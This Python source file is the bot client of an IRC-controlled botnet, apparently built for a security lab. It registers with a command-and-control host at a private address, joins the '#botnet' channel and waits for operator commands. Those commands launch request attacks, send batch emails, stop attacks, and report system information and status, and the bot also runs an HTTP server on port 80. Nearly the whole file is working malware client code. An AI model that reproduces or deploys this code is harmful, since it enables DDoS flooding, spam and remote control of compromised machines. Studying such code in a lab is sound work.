import concurrent
import socket
from http.server import BaseHTTPRequestHandler, HTTPServer
from concurrent.futures import ThreadPoolExecutor
from httpServerRH import HTTPServerRH, stopAttack, batchEmail, execRequest, getSystemInfo, getStatus


def sendMessage(s, message):
    s.send(bytes(f"{message}\r\n", "UTF-8"))


def readMessage(s):
    buff = s.recv(2048).decode("UTF-8")
    message = buff.split("\r\n")
    for m in message:
        if m.startswith("PING"):
            sendMessage(s, "PONG :botnet.sicurezza.com")
        if m.startswith(":cc!cc"):
            print(m)
            if "PING" in m:
                sendMessage(s, f"PRIVMSG cc #botnet: PONG")
                return
            comando = m[m.index(":#botnet: ")+10::]
            comando = comando.split("|")
            match comando[0]:
                case "get":
                    target, action = execRequest(comando[1],comando[2])
                    sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
                    return
                case "stop":
                    target, action = stopAttack()
                    sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
                    return
                case "systemInfo":
                    m = getSystemInfo()
                    sendMessage(s, f"PRIVMSG cc #botnet: systemInfo|{m}")
                    return
                case "send":
                    target, action = batchEmail(comando[1],comando[2],comando[3])
                    sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
                    return
                case "status":
                    target, action = getStatus()
                    sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
                    return


class Bot:
    myIp = socket.gethostbyname(socket.gethostname())
    host = '10.0.2.10'
    port = 49171
    httpPort = 80
    ircPort = 6667

    def __init__(self):
        self.sendInfo()
        task = []
        with ThreadPoolExecutor(max_workers=2) as exec:
            task.append(exec.submit(self.httpServer))
            task.append(exec.submit(self.ircConnection))
            done, not_done = concurrent.futures.wait(task, return_when=concurrent.futures.FIRST_COMPLETED)
            exec.shutdown(wait=False)

    def sendInfo(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            message = self.myIp + ' {"http":' + str(self.httpPort) + ',"irc":' + str(
                self.ircPort) + ',"target":"-","action":"waiting"}'
            while message != 'bot registrated succesfully':
                s.send(message.encode())
                message = s.recv(1024).decode()
            s.close()
        except Exception as e:
            print("Information send error: ", e)
        finally:
            s.close()

    def httpServer(self):
        httpd = None
        try:
            httpd = HTTPServer((self.myIp, 80), HTTPServerRH)
            httpd.serve_forever()
        except Exception as e:
            print("HTTP error: ", e)
            httpd.shutdown()

    def ircConnection(self):
        NICKNAME = "bot-"+self.myIp.replace(".","-")
        CHANNEL = "#botnet"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.ircPort))
            s.send(bytes(f"NICK {NICKNAME}\r\n", "UTF-8"))
            s.send(bytes(f"USER {NICKNAME} {self.myIp} {NICKNAME} :{NICKNAME}:\r\n", "UTF-8"))

            sendMessage(s, f"JOIN {CHANNEL}\r\n")

            while True:
                readMessage(s)
        except Exception as e:
            print("IRC error:",e)


if __name__ == '__main__':
    b = Bot()
